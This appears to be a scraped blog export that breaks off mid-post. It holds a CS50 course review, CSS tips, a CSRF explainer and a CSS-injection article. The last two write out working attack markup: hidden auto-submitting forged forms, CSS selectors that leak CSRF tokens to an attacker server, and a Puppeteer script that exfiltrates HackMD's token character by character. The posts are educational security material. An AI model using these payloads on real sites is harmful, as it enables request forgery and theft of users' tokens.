O(n^2) sorting and binary search Week 4Re-introduction to recursionString, pointer, struct, bitmap formatFile processing (fprint&#x2F;fopen…)malloc, memory allocationTeaching how to use xxd to view files in hexAssignment: Given a bitmap header document, process the bitmap image, such as enlarging it twice Week 5In-depth discussion of memory and pointersData structures: linked list, queue, stack, tree, BST, tries, hashmapTeaching how to use wget to download files and how to write a MakefileAssignment: Implement a dictionary tree or hashmap Week 6This week begins with topics related to the Internet, including: IP, IPv6domain, nslookup, traceroute, packetports, dns, vpn, http, request, responseTeaching how to use chmod to change file permissions and how to use curl to grab web pagesAssignment: Write a part of an http server in C Week 7Using chrome dev tool, such as viewing html, requestBasic html and css tutorialsIntroduction to phpIntroduction to get&#x2F;post parametersBasic sql tutorialTeaching how to use apt-get to install packagesAssignment: Complete a simple php webpage and communicate with the database Week 8Demonstrating code refactoring and explaining the concept of MVCTeaching basic SQL syntaxIntroduction to SQL InjectionAssignment: Connect to Google Map API and use jQuery and ajax to create a more interactive webpage Week 9Introduction to javascript syntaxExplanation of json formatDOM modelEvent handler, event mechanism(No assignments after this week) Week 10Exploring information security and privacySuch as password security (encryption algorithm, salting)Smart TVPhishing emailsTwo-factor authenticationCookies, session, httpsAlso briefly talked about speech recognition, such as the principle behind siri Week 11Introduction to game AI and self-driving cars. Topics covered include:dfs, bfsminimaxevaluation functionalpha-beta pruningAI characteristics of different gamesAlso briefly touched on machine learning, such as how Netflix recommends movies to users. Week 12Course review and playing some small games. Not much content this week. When I took this course, I was amazed. Wow! They actually teach you how to write a Makefile, and even teach you how to use xxd to view files. They even give you a bitmap file and ask you to read it according to the format, then enlarge it and write it back! The most frustrating assignment for me was the http server, because I had to use C to do string processing… From the above 12 weeks of course introduction, you can see that this course is really deep and wide. After finishing it, you can learn: Basic programming skills: variables, arrays, conditionals, loops, functions You learned pointers! Directly manipulate memory and understand what the computer is doing at the low level Familiar with basic sorting algorithms and data structures Use of various command line instructions (I think this is super practical) Basic knowledge of networks (ip, dns, server, port, request, response…) Backend programming language PHP Front-end HTML&#x2F;CSS&#x2F;JavaScript Use and command of database MySQL Information security (encryption and decryption, SQL injection, buffer overflow) Basic understanding of machine learning, artificial intelligence, and speech recognition I have always been self-taught in programming, although I have taken several programming-related courses after college, but they were just for review and I didn’t learn much. But this course really made me admire it from the bottom of my heart. Everything introduced in the course is very practical, and some of them I have only recently used. Even the command line was not used by me before because I never had the opportunity to use it. In addition, although the content of this course is deep, the teacher is humorous and can make the concepts vivid. For example, when talking about binary search, the teacher took the phone book as an example and tore it in half from the middle! Or when talking about binary, there are several light bulbs on the stage, and the lit ones are 1 and the dark ones are 0, which deepens the impression through such physical interaction. In terms of course teaching, there are several points that I appreciate.First, start with scratch. After completing CS50, I decided that when I teach programming in the future, I will start with scratch. Because it is visualized, you can clearly see what the structure of the program looks like; and it is fast and has complete built-in resources. If you want to make a game, just drag a few characters and define some events. I think scratch is the best choice for programming beginners. Second, package difficult-to-explain concepts first. Like strings, in C, it is actually an array formed by char*, or char. But how do you explain it to students at the beginning? So they wrote a string type to hide this information, and when they got to arrays later, they explained it to the students. There is also scanf, which involves concepts such as pointer and call by value, which is not suitable to be explained at the beginning. But the program still needs input, what should I do? So they packaged it into a GetInt() function to encapsulate these details. Third, cloud IDE. Setting up a development environment is not an easy task. CS50 and c9 cooperate to provide an online IDE. You can write code, view files, and use command line operations, and all assignments are completed on it. Super convenient! Finally, this is a hard course, but at the same time it is a very solid and useful course. Recommended for anyone who wants to learn programming. If you are taking this course and cannot find anyone to discuss with, you can go to this Facebook group:cs50 Chinese discussion group","link":"/2016/03/28/en/cs50-programming-course-like-ocean/"},{"title":"Let's talk about CSRF","text":"IntroductionRecently, I encountered some cases of CSRF and took the opportunity to study it thoroughly. After in-depth research, I found that this attack is actually quite scary because it is easy to overlook. Fortunately, some frameworks now have built-in CSRF defense functions that can be easily enabled. However, I still think it is necessary to understand what CSRF is, how it attacks, and how to defend against it. Let’s start by briefly introducing it! CSRF is a type of attack on the web, which stands for Cross Site Request Forgery. Don’t confuse it with XSS, they are two different things. So what is CSRF? Let’s start with an example of my own. Lazy deletion functionI used to have a simple backend page, which can be considered as a blog! You can publish, delete, and edit articles, and the interface looks like this: You can see the delete button, which can delete an article when clicked. At that time, because I was lazy, I thought that if I made this function into GET, I could complete the deletion with just a link, and I hardly needed to write any code on the front end: &lt;a href='/delete?id=3'>Delete&lt;/a> Very convenient, right? Then I did some verification on the backend of the webpage to verify whether the request carried the session id and whether the article was written by the author of this id. If they all match, the article will be deleted. Well, it sounds like I have done everything I should do: “Only the author himself can delete his own article”, so it should be safe. Is there anything missing? Yes, it is indeed “Only the author himself can delete his own article”, but what if he does not “actively delete” it, but deletes it without knowing it? You may think I am talking about something, how can someone delete it if it is not the author who actively deletes it? Okay, let me show you how it can be deleted! Today, let’s assume that Xiaohei is an evil villain who wants Xiaoming to delete his own article without knowing it. How to do it? He knows that Xiaoming likes psychological tests, so he made a psychological test website and sent it to Xiaoming. But the difference between this psychological test website and other websites is that the “Start Test” button looks like this: &lt;a href='https://small-min.blog.com/delete?id=3'>Start Test&lt;/a> After Xiaoming receives the webpage, he is very happy and clicks “Start Test”. After clicking, the browser will send a GET request to https://small-min.blog.com/delete?id=3, and because of the operation mechanism of the browser, all the cookies of small-min.blog.com will be sent together. After receiving the request, the server checks the session and finds that it is Xiaoming, and this article is indeed written by Xiaoming, so it deletes the article. This is CSRF. You are clearly on the psychological test website, let’s say it is https://test.com, but you unknowingly deleted the article of https://small-min.blog.com. Isn’t it terrible? Super scary! This is also why CSRF is also called a one-click attack. You are hit by just one click. You may say: “But Xiaoming will know it, won’t he? He will go to the blog, won’t he?” Okay, what if we change it to this: &lt;img src='https://small-min.blog.com/delete?id=3' width='0' height='0' /> &lt;a href='/test'>Start Test&lt;/a> At the same time as opening the page, a deletion request is sent out, but this time Xiaoming really has no idea about it. This is in line with it! CSRF is a way to forge a “request sent by the user himself” under different domains. To achieve this, it is very simple. Because of the mechanism of the browser, as long as you send a request to a certain domain, the associated cookies will be sent together. If the user is logged in, then this request naturally contains his information (such as session id), and this request looks like it was sent by the user himself. Can’t I just change the deletion to POST?Yes, smart! Let’s not be so lazy and make the deletion function into POST, so that it cannot be attacked through &lt;a&gt; or &lt;img&gt;, right? Unless there is an HTML element that can send a POST request! There is a form called “form”. &lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"> &lt;input type=\"hidden\" name=\"id\" value=\"3\"/> &lt;input type=\"submit\" value=\"Start Test\"/> &lt;/form> After Xiao Ming clicked it, he was still tricked and the article was deleted. You may wonder, but doesn’t Xiao Ming know now? I was also skeptical, so I Googled and found this article: Example of silently submitting a POST FORM (CSRF) The example provided in this article is as follows. The world of web pages is really vast and profound: &lt;iframe style=\"display:none\" name=\"csrf-frame\">&lt;/iframe> &lt;form method='POST' action='https://small-min.blog.com/delete' target=\"csrf-frame\" id=\"csrf-form\"> &lt;input type='hidden' name='id' value='3'> &lt;input type='submit' value='submit'> &lt;/form> &lt;script>document.getElementById(\"csrf-form\").submit()&lt;/script> Open an invisible iframe, let the result after form submit appear in the iframe, and this form can also be automatically submitted, without any operation by Xiao Ming. At this point, you know that changing to POST is useless. What if I change the backend to only accept JSON?You had a bright idea: “Since only form can submit POST on the front end, can’t I change my API to receive data with JSON? Then form can’t be used, right?” spring’s document tells you: this is still useless! &lt;form action=\"https://small-min.blog.com/delete\" method=\"post\" enctype=\"text/plain\"> &lt;input name='&#123;\"id\":3, \"ignore_me\":\"' value='test\"&#125;' type='hidden'> &lt;input type=\"submit\" value=\"delete!\"/> &lt;/form> This will generate the following request body: &#123; \"id\": 3, \"ignore_me\": \"=test\" &#125; However, it is worth noting here that form can only carry three types of content types: application/x-www-form-urlencoded, multipart/form-data, and text/plain. In the above attack, we used the last one, text/plain. If your backend server checks this content type, you can avoid the above attack. The example we gave was deleting an article, which you may think is not a big deal. But what if it’s a bank transfer? Attackers can write code on their own web pages to transfer money to their own accounts, and then spread this web page to receive a lot of money. After talking so much, let’s talk about how to defend! Let’s start with the simplest “user”. User’s defenseThe reason why CSRF attacks can succeed is that the user is in a logged-in state on the attacked web page, so they can take some actions. Although these attacks should be handled by the web page, if you are really afraid that the web page will not handle them well, you can log out every time you use the website to avoid CSRF. Alternatively, turning off js execution or filtering out the code of these patterns not to execute is also a method (but it should be difficult to determine which code is the code of CSRF attack). So what users can do is actually limited. The server side is the one that really needs to do something! Server’s defenseThe reason why CSRF is scary is because of the two letters CS: Cross Site. You can launch attacks under any URL. The defense against CSRF can be thought from this direction, in short: “How can I block requests from other domains.” Think about it carefully, what is the difference between a CSRF request and a request made by the user? The difference lies in the domain. The former is sent from any domain, while the latter is sent from the same domain (assuming that your API and frontend website are on the same domain). Check RefererThe request header contains a field called “referer”, which indicates where the request came from. You can check this field to see if it is a valid domain. If it is not, you can reject it. However, there are three things to note about this method. First, some browsers may not include the referer field. Second, some users may disable the automatic inclusion of the referer field, which would cause your server to reject requests made by real users. The third thing to note is that the code that determines whether a domain is valid must be bug-free. For example: const referer = request.headers.referer; if (referer.indexOf('small-min.blog.com') > -1) &#123; // pass &#125; Do you see the problem with the above code? If the attacker’s webpage is small-min.blog.com.attack.com, your check will fail. Therefore, checking the referer is not a very complete solution. Add Captcha, SMS Verification, etc.Just like when transferring money on online banking, you are required to receive an SMS verification code. Adding this extra check can ensure that you are not attacked by CSRF. The same goes for captcha. Attackers do not know the answer to the captcha, so they cannot attack. This is a very complete solution, but if users have to enter a captcha every time they delete a blog, they will probably be annoyed! Add CSRF TokenTo prevent CSRF attacks, we just need to ensure that some information is “known only to the user”. How do we do that? We add a hidden field called csrftoken to the form. The value of this field is randomly generated by the server and stored in the server’s session. &lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"> &lt;input type=\"hidden\" name=\"id\" value=\"3\"/> &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\"/> &lt;input type=\"submit\" value=\"Delete Post\"/> &lt;/form> After submitting the form, the server compares the csrftoken in the form with the one stored in its session. If they are the same, it means that this is indeed a request made by the user. This csrftoken is generated by the server and should be changed for each different session. Why does this work? Because the attacker does not know the value of the csrftoken, they cannot guess it and therefore cannot attack. However, there is another scenario. What if your server supports cross-origin requests? What happens then? The attacker can make a request on their page, successfully obtain the CSRF token, and launch an attack. But this is only possible if your server accepts requests from that domain. Now let’s take a look at another solution. Double Submit CookieThe previous solution requires server state, i.e. the CSRF token must be stored on the server to verify its correctness. The advantage of this solution is that it does not require the server to store anything. The first half of this solution is similar to the previous one. The server generates a random token and adds it to the form. But the difference is that, in addition to not having to write this value in the session, the client side also sets a cookie named csrftoken with the same token value. Set-Cookie: csrftoken=fj1iro2jro12ijoi1 &lt;form action=\"https://small-min.blog.com/delete\" method=\"POST\"> &lt;input type=\"hidden\" name=\"id\" value=\"3\"/> &lt;input type=\"hidden\" name=\"csrftoken\" value=\"fj1iro2jro12ijoi1\"/> &lt;input type=\"submit\" value=\"Delete Post\"/> &lt;/form> You can think carefully about the differences between a CSRF attack request and a request made by the user. The difference lies in the fact that the former comes from a different domain, while the latter comes from the same domain. So as long as we can distinguish whether this request comes from the same domain, we win. And the Double Submit Cookie solution is based on this idea. When the user presses submit, the server compares the csrftoken in the cookie with the csrftoken in the form to check if they have a value and are equal, to know if it is from the user. Why? Suppose an attacker wants to attack now. He can write a csrf token in the form at will, which is of course no problem, but because of the browser’s restrictions, he cannot set the cookie of small-min.blog.com on his domain! So the csrftoken in the cookie of the request he sends up will not exist, and it will be blocked. Of course, this method seems to be useful, but it also has its drawbacks, as can be seen in Double Submit Cookies vulnerabilities. If the attacker controls any of your subdomains, he can help you write cookies and successfully attack you. Client-side Double Submit CookieThe reason why client-side is mentioned specifically is that the project I previously encountered was a Single Page Application. Searching the web, you will find people asking, “How can SPA get CSRF token?” Do you need to provide another API from the server? This seems a bit strange. However, I think we can use the spirit of Double Submit Cookie to solve this problem. The key to solving this problem is to generate the csrf token from the client-side. There is no need to interact with the server API. The other processes are the same as before, generating and putting it into the form and writing it to the cookie. Or if you are an SPA, you can also directly put this information in the request header, and you don’t have to do this for every form, just add it in one place. In fact, the library I often use, axios, provides such a function. You can set the header name and cookie name. After setting it up, every request it sends will automatically fill in the value in the cookie for you. &#x2F;&#x2F; &#96;xsrfCookieName&#96; is the name of the cookie to use as a value for xsrf token xsrfCookieName: &#39;XSRF-TOKEN&#39;, &#x2F;&#x2F; default &#x2F;&#x2F; &#96;xsrfHeaderName&#96; is the name of the http header that carries the xsrf token value xsrfHeaderName: &#39;X-XSRF-TOKEN&#39;, &#x2F;&#x2F; default Why can this token be generated by the client? Because the purpose of this token itself does not contain any information, it is just to prevent “attackers” from guessing, so it doesn’t matter whether it is generated by the client or the server, as long as it is not guessed. The core concept of Double Submit Cookie is: “Attackers cannot read and write cookies of the target website, so the csrf token of the request will be different from that in the cookie.” Browser’s own defenseWe just mentioned what users can do, what web front-end and back-end can do, what about browsers? The reason why CSRF can exist is due to the mechanism of the browser. Is it possible to solve this problem from the browser side? Yes! And it already exists. And the method of enabling it is very, very simple. Google officially added this feature in Chrome 51: SameSite cookie. For those interested in the detailed operation principle, please refer to draft-west-first-party-cookies-07. First, let’s quote Google’s explanation: Enabling this feature is very simple. Your original cookie header looks like this: Set-Cookie: session_id&#x3D;ewfewjf23o1; You just need to add SameSite at the end: Set-Cookie: session_id&#x3D;ewfewjf23o1; SameSite However, there are two modes for SameSite: Lax and Strict, with the latter being the default. You can also specify the mode yourself: Set-Cookie: session_id&#x3D;ewfewjf23o1; SameSite&#x3D;Strict Set-Cookie: foo&#x3D;bar; SameSite&#x3D;Lax Let’s first talk about the default Strict mode. When you add the SameSite keyword, it means “this cookie can only be used by the same site and should not be added to any cross-site requests”. This means that after you add it, all the &lt;a href=&quot;&quot;&gt;, &lt;form&gt;, and new XMLHttpRequest requests that are not verified by the browser to be initiated from the same site will not carry this cookie. However, this will cause a problem. If even &lt;a href=&quot;...&quot;&gt; does not carry the cookie, when I click on a link from a Google search result or a link shared by a friend to enter a website, because the cookie is not carried, the website will become logged out. This is a very bad user experience. There are two solutions. The first is like Amazon, where two sets of different cookies are prepared. The first set is used to maintain the login status, and the second set is used for sensitive operations (such as purchasing, account settings, etc.). The first set does not set SameSite, so no matter where you come from, you will be logged in. However, even if the attacker has the first set of cookies, they cannot do anything because they cannot perform any operations. The second set completely avoids CSRF because of the SameSite setting. But this is still a bit troublesome, so you can consider the second solution, which is to adjust to the other mode of SameSite: Lax. The Lax mode relaxes some restrictions. For example, &lt;a&gt;, &lt;link rel=&quot;prerender&quot;&gt;, and &lt;form method=&quot;GET&quot;&gt; will still carry the cookie. However, forms with POST methods or any methods such as POST, PUT, DELETE will not carry the cookie. So on the one hand, you can maintain flexibility, allowing users to maintain their login status when entering your website from other websites, and on the other hand, you can prevent CSRF attacks. However, under the Lax mode, GET-based CSRF cannot be blocked, so this should be noted. Speaking of this relatively new feature, I believe everyone is very interested in how well it is supported by browsers. caniuse tells us that currently only Chrome supports this new feature (after all, it is Google’s own solution, so they naturally support it). Although the browser support is not very high, other browsers may also implement this feature in the future, so it is worth adding SameSite now and not worrying about CSRF in the future. I just briefly introduced it. draft-west-first-party-cookies-07 discusses many details, such as what exactly is considered cross-site? Must it be on the same domain? Can subdomains be used? You can study it yourself, or this article: SameSite Cookie, Preventing CSRF Attacks also mentions it. References related to SameSite: Preventing CSRF with the same-site cookie attribute Goodbye, CSRF: Explaining the SameSite property in set-cookie SameSite Cookie, Preventing CSRF Attacks SameSite - A new mechanism to prevent CSRF &amp; XSSI Cross-Site Request Forgery is dead! SummaryThis article mainly introduces the attack principle of CSRF and two defense methods, focusing on common scenarios. When developing web pages, CSRF is a more commonly overlooked focus than XSS. When there are any important operations on the web page, special attention should be paid to whether there is a risk of CSRF. This time, I found a lot of reference materials, but I found that articles related to CSRF are actually similar. If you want to know more details, you need to spend a lot of effort to find them, but fortunately, there are also many materials on Stackoverflow that can be referenced. Because I haven’t delved too much into information security, if there is any part of the article that is wrong, please feel free to point it out in the comments. I would also like to thank my friend shik for his guidance, telling me that there is such a thing as SameSite, which allows me to add the last paragraph. I hope this article can give everyone a more comprehensive understanding of CSRF. References Cross-Site Request Forgery (CSRF) Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet A more profound understanding of CSRF [Technical Sharing] Cross-site Request Forgery (Part 2) Spring Security Reference Countermeasures for CSRF attacks","link":"/2017/03/12/en/csrf-introduction/"},{"title":"Some useful CSS properties that are not easy to remember","text":"IntroductionAfter writing CSS for a while, we should all be familiar with common properties such as display, position, padding, margin, border, background, etc. We can write them smoothly without having to look up anything. These properties are common because they are used in many places. However, some CSS properties can only be used in specific places or under specific circumstances. I often forget these less commonly used properties, but they are actually very important in some cases. Therefore, in this article, I want to introduce some CSS properties that I think are not easy to remember but are very useful. This is also a note for myself. The outline and color of the input boxCompared with border, outline is a less common property, but it is particularly useful when applied to input. By default, when you focus on an input, a blue circle appears around it: That blue circle is the outline, which can be confirmed through Chrome devtool: So if you don’t want an outline or want to change its color, you can use the outline property to modify it. The vertical line that keeps flashing after focusing is called the caret. If you want to change its color, you can use the caret-color property: The blue box when clickingI remember that when I clicked on something on my phone, a blue box or something similar appeared. However, I couldn’t reproduce it just now. The corresponding property is called -webkit-tap-highlight-color, and you can search for other articles and examples using this keyword. Movement beyond the range when scrollingI don’t know how to describe this clearly, so let’s look at the picture: Sometimes on mobile devices, you can scroll beyond the page and see the white background, or some browsers have a pull-to-refresh function. When you scroll down from the top of the page, it will refresh. If you want to prevent this behavior, you can use the overscroll-behavior property. For more detailed introduction, please refer to: Take control of your scroll: customizing pull-to-refresh and overflow effects Smooth scrollingMany websites have a function where the headings of each paragraph of an article appear on the right side. Clicking on them will quickly scroll to that paragraph. If nothing is set, clicking will jump directly to that paragraph. However, there is a thing called smooth scrolling, which has some transitions in the middle and lets the user know where they are scrolling to. A long time ago, this function may have required JS, but now it can be done with the CSS scroll-behavior: smooth; (the example below is from MDN): Scroll position when loading new contentMany websites automatically load more content when you scroll to the bottom. When loading more content, you would expect the user to stay in the same position and not automatically scroll down because of the new content. However, sometimes the default behavior of the browser is not as expected. When you load more elements, the screen may not stay in the position you imagined. At this time, you can use the overflow-anchor CSS property to adjust this behavior. For details, please refer to: CSS overflow-anchor property and scroll anchoring Slide one element at a timeSometimes we need an effect where the user can slide to the next element with just a light swipe, instead of sliding to anywhere on the page. This can be achieved using scroll-snap related properties, like this: This feels quite useful when making a carousel. For more usage examples, you can refer to Practical CSS Scroll Snapping, where the example above is also from. 300ms click delay on mobileMany people know that there is a delay of about 300ms for click events on mobile devices, which means that you have to wait 300ms after clicking before the click event is triggered. This delay exists because on mobile devices, you can double-tap to zoom in, so when you click for the first time, the browser doesn’t know if you want to click twice or just once, so it needs to wait for a period of time. This delay seems to have been removed before, but if you still encounter it, you can use the touch-action: manipulation CSS property to solve it. This property can disable some gestures. For more details, you can refer to MDN, or this article: 300ms tap delay, gone away. By the way, I saw this CSS property on Facebook’s website. font-smoothI saw this property in the default css of Create React App: body &#123; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; &#125; In fact, these two properties can be found on many websites. I found out that they are related to font rendering. For example, antialiased is actually the “anti-aliasing” that everyone should have heard of. You can decide how to render the font yourself. For more details, you can refer to: Understanding CSS properties font-kerning, font-smoothing, font-variant What is font smoothing in CSS? ConclusionThis article is a simple note on some CSS properties that I find difficult to remember, because I don’t use them frequently, so I easily forget their names when I actually need to use them. If the keywords are not correct, it is difficult to find out what the property is called. One of the reasons why I wanted to write this article is because a friend asked me how to solve a certain behavior, and I originally thought it was impossible or had to be done with JS, but later I found out that it could be solved with CSS. Because I knew that property, I was able to solve it, so it is very helpful to look at more CSS properties in your spare time. At least when you encounter a problem, you will know that you can use CSS to solve it. If you also know some CSS properties like this, feel free to share them with me.","link":"/2021/04/17/en/css-attrs/"},{"title":"Stealing Data with CSS - CSS Injection (Part 1)","text":"When it comes to attacks on web front-ends, most people think of XSS. But what if you can’t execute JavaScript on the web page? Are there other attack methods? For example, what can you do if you can insert a style tag? In 2018, I wrote an article about CSS keylogger: attack and defense after seeing related discussions on Hacker News. I spent some time researching it. Now, four years later, I have re-examined this attack technique from a security perspective and plan to write one or two articles to explain CSS injection in detail. This article covers: What is CSS injection? The principle of stealing data with CSS How to steal data from hidden input How to steal data from meta Using HackMD as an example What is CSS injection?As the name suggests, CSS injection means that you can insert any CSS syntax on a page, or more specifically, you can use the &lt;style&gt; tag. You may wonder why this is possible. I think there are two common situations. The first is that the website filters out many tags, but does not consider &lt;style&gt; to be a problem, so it is not filtered out. For example, many websites use ready-made libraries to handle sanitization, including a well-known one called DOMPurify. In DOMPurify (v2.4.0), by default, it will filter out all kinds of dangerous tags and leave only some safe ones, such as &lt;h1&gt; or &lt;p&gt;. The key is that &lt;style&gt; is also included in the default safe tags. Therefore, if you do not specify parameters, &lt;style&gt; will not be filtered out by default, allowing attackers to inject CSS. The second situation is that although HTML can be inserted, JavaScript cannot be executed due to CSP (Content Security Policy). Since JavaScript cannot be executed, attackers can only look for ways to use CSS to perform malicious behavior. So what can you do after CSS injection? Isn’t CSS just used to decorate web pages? Can changing the background color of a web page be an attack? Stealing Data with CSSCSS is indeed used to decorate web pages, but by combining two features, CSS can be used to steal data. The first feature is attribute selectors. In CSS, there are several selectors that can select “elements whose attributes match certain conditions.” For example, input[value^=a] selects elements whose value starts with a. Similar selectors include: input[value^=a] starts with a (prefix) input[value$=a] ends with a (suffix) input[value*=a] contains a (contains) The second feature is that CSS can send requests, such as loading a background image from a server, which is essentially sending a request. Suppose there is a piece of content on the page &lt;input name=&quot;secret&quot; value=&quot;abc123&quot;&gt;, and I can insert any CSS. I can write it like this: input[name=\"secret\"][value^=\"a\"] &#123; background: url(https://myserver.com?q=a) &#125; input[name=\"secret\"][value^=\"b\"] &#123; background: url(https://myserver.com?q=b) &#125; input[name=\"secret\"][value^=\"c\"] &#123; background: url(https://myserver.com?q=c) &#125; //.... input[name=\"secret\"][value^=\"z\"] &#123; background: url(https://myserver.com?q=z) &#125; What will happen? Because the first rule has found the corresponding element, the background of the input will be an image from the server, and the browser will send a request to https://myserver.com?q=a. Therefore, when I receive this request on the server, I know that “the first character of the value attribute of the input is a,” and I have successfully stolen the first character. This is why CSS can steal data. By combining attribute selectors with the ability to load images, the server can know the attribute value of a certain element on the page. Now that we have confirmed that CSS can steal attribute values, there are two questions: What can be stolen? You only demonstrated stealing the first character, how do you steal the second character? Let’s first discuss the first question. What can be stolen? Usually, you want to steal some sensitive data, right? The most common target is the CSRF token. If you don’t know what CSRF is, you can first take a look at this article I wrote before: Let’s talk about CSRF (by the way, I plan to write a new CSRF series, it’s in progress, if you want to read it, you can leave a message to urge me). Simply put, if the CSRF token is stolen, it may be vulnerable to CSRF attacks. In short, just think of this token as very important. And this CSRF token is usually placed in a hidden input, like this: &lt;form action=\"/action\"> &lt;input type=\"hidden\" name=\"csrf-token\" value=\"abc123\"> &lt;input name=\"username\"> &lt;input type=\"submit\"> &lt;/form> How can we steal the data inside? Stealing hidden inputFor hidden input, writing it as we did before won’t work: input[name=\"csrf-token\"][value^=\"a\"] &#123; background: url(https://example.com?q=a) &#125; Because the input type is hidden, this element will not be displayed on the screen. Since it is not displayed, the browser does not need to load the background image, so the server will not receive any requests. And this restriction is very strict, even if you use display:block !important;, it cannot be overridden. What should we do? It’s okay, we have other selectors, like this: input[name=\"csrf-token\"][value^=\"a\"] + input &#123; background: url(https://example.com?q=a) &#125; There is an additional + input at the end. This plus sign is another selector, which means “select the element behind it”. So the entire selector combined is “I want to select the input behind the input whose name is csrf-token and whose value starts with a”, which is &lt;input name=&quot;username&quot;&gt;. Therefore, the element that actually loads the background image is another element, and the other element does not have type&#x3D;hidden, so the image will be loaded normally. What if there are no other elements behind it? Like this: &lt;form action=\"/action\"> &lt;input name=\"username\"> &lt;input type=\"submit\"> &lt;input type=\"hidden\" name=\"csrf-token\" value=\"abc123\"> &lt;/form> In this case, it was really impossible to do anything before because CSS did not have a selector that could select “the element in front of it”, so it was really helpless. But now it’s different because we have :has, which can select “the element below that meets special conditions”, like this: form:has(input[name=\"csrf-token\"][value^=\"a\"])&#123; background: url(https://example.com?q=a) &#125; This means “I want to select the form below (the input that meets that condition)”, so the form will be the one that loads the background, not the hidden input. This has selector is very new and has only been officially supported since Chrome 105 released at the end of last month. Only the stable version of Firefox has not yet supported it. For details, see: caniuse With has, it is basically invincible because you can specify which parent element to change the background, so you can select it however you want. Stealing metaIn addition to placing the data in a hidden input, some websites also place the data in &lt;meta&gt;, such as &lt;meta name=&quot;csrf-token&quot; content=&quot;abc123&quot;&gt;. Meta is also an invisible element. How can we steal it? First of all, as mentioned at the end of the previous paragraph, has is absolutely stealable, and you can steal it like this: html:has(meta[name=\"csrf-token\"][content^=\"a\"]) &#123; background: url(https://example.com?q=a); &#125; But in addition to this, there are other ways to steal it. Although meta cannot be seen, unlike hidden input, we can use CSS to make this element visible: meta &#123; display: block; &#125; meta[name=\"csrf-token\"][content^=\"a\"] &#123; background: url(https://example.com?q=a); &#125; But this is not enough. You will find that the request has not been sent yet. This is because meta is under head, and head also has the default display:none property, so you also need to set head specially to make meta “visible”: head, meta &#123; display: block; &#125; meta[name=\"csrf-token\"][content^=\"a\"] &#123; background: url(https://example.com?q=a); &#125; If you write it like this, you will see the browser sending out a request. However, there is no display on the screen because after all, content is an attribute, not an HTML text node, so it will not be displayed on the screen. But the meta element itself is actually visible, which is why the request is sent: If you really want to display content on the screen, you can actually do it by using pseudo-elements with attr: meta:before &#123; content: attr(content); &#125; You will see the content inside the meta tag displayed on the screen. Finally, let’s look at a practical example. Stealing HackMD’s DataHackMD’s CSRF token is placed in two places, one is a hidden input, and the other is a meta tag, with the following content: &lt;meta name=\"csrf-token\" content=\"h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI\"> HackMD actually supports the use of &lt;style&gt; tags, which will not be filtered out, so you can write any style you want, and the relevant CSP is as follows: img-src * data:; style-src &#39;self&#39; &#39;unsafe-inline&#39; https:&#x2F;&#x2F;assets-cdn.github.com https:&#x2F;&#x2F;github.githubassets.com https:&#x2F;&#x2F;assets.hackmd.io https:&#x2F;&#x2F;www.google.com https:&#x2F;&#x2F;fonts.gstatic.com https:&#x2F;&#x2F;*.disquscdn.com; font-src &#39;self&#39; data: https:&#x2F;&#x2F;public.slidesharecdn.com https:&#x2F;&#x2F;assets.hackmd.io https:&#x2F;&#x2F;*.disquscdn.com https:&#x2F;&#x2F;script.hotjar.com; You can see that unsafe-inline is allowed, so you can insert any CSS. After confirming that CSS can be inserted, you can start preparing to steal data. Remember the question that was not answered earlier, “How do you steal the second character and beyond?” Let me answer it using HackMD as an example. First, CSRF tokens are usually refreshed when the page is refreshed, so you cannot refresh the page. HackMD happens to support real-time updates. As long as the content changes, it will be immediately reflected on the screens of other clients. Therefore, you can achieve “updating styles without refreshing the page”. The process is as follows: Prepare the style to steal the first character and insert it into HackMD The victim opens the page The server receives the request for the first character Update the HackMD content from the server and switch to the payload to steal the second character The victim’s page is updated in real-time and loads the new style The server receives the request for the second character Repeat until all characters are stolen The simple diagram is as follows: The code is as follows: const puppeteer = require('puppeteer'); const express = require('express') const sleep = ms => new Promise(resolve => setTimeout(resolve, ms)); // Create a hackMD document and let anyone can view/edit const noteUrl = 'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf' const host = 'http://localhost:3000' const baseUrl = host + '/extract?q=' const port = process.env.PORT || 3000 ;(async function() &#123; const app = express() const browser = await puppeteer.launch(&#123; headless: true &#125;); const page = await browser.newPage(); await page.setViewport(&#123; width: 1280, height: 800 &#125;) await page.setRequestInterception(true); page.on('request', request => &#123; const url = request.url() // cancel request to self if (url.includes(baseUrl)) &#123; request.abort() &#125; else &#123; request.continue() &#125; &#125;); app.listen(port, () => &#123; console.log(`Listening at http://localhost:$&#123;port&#125;`) console.log('Waiting for server to get ready...') startExploit(app, page) &#125;) &#125;)() async function startExploit(app, page) &#123; let currentToken = '' await page.goto(noteUrl + '?edit'); // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele await page.addStyleTag(&#123; content: \"&#123;scroll-behavior: auto !important;&#125;\" &#125;); const initialPayload = generateCss() await updateCssPayload(page, initialPayload) console.log(`Server is ready, you can open $&#123;noteUrl&#125;?view on the browser`) app.get('/extract', (req, res) => &#123; const query = req.query.q if (!query) return res.end() console.log(`query: $&#123;query&#125;, progress: $&#123;query.length&#125;/36`) currentToken = query if (query.length === 36) &#123; console.log('over') return &#125; const payload = generateCss(currentToken) updateCssPayload(page, payload) res.end() &#125;) &#125; async function updateCssPayload(page, payload) &#123; await sleep(300) await page.click('.CodeMirror-line') await page.keyboard.down('Meta'); await page.keyboard.press('A'); await page.keyboard.up('Meta'); await page.keyboard.press('Backspace'); await sleep(300) await page.keyboard.sendCharacter(payload) console.log('Updated css payload, waiting for next request') &#125; function generateCss(prefix = \"\") &#123; const csrfTokenChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'.split('') return ` $&#123;prefix&#125; &lt;style> head, meta &#123; display: block; &#125; $&#123; csrfTokenChars.map(char => ` meta[name=\"csrf-token\"][content^=\"$&#123;prefix + char&#125;\"] &#123; background: url($&#123;baseUrl&#125;$&#123;prefix + char&#125;) &#125; `).join('\\n') &#125; &lt;/style> ` &#125; You can run it directly with Node.js. After running it, open the corresponding file in the browser, and you can see the progress of the leak in the terminal. However, even if you steal HackMD’s CSRF token, you still cannot perform CSRF attacks because HackMD checks other HTTP request headers such as origin or referer on the server to ensure that the request comes 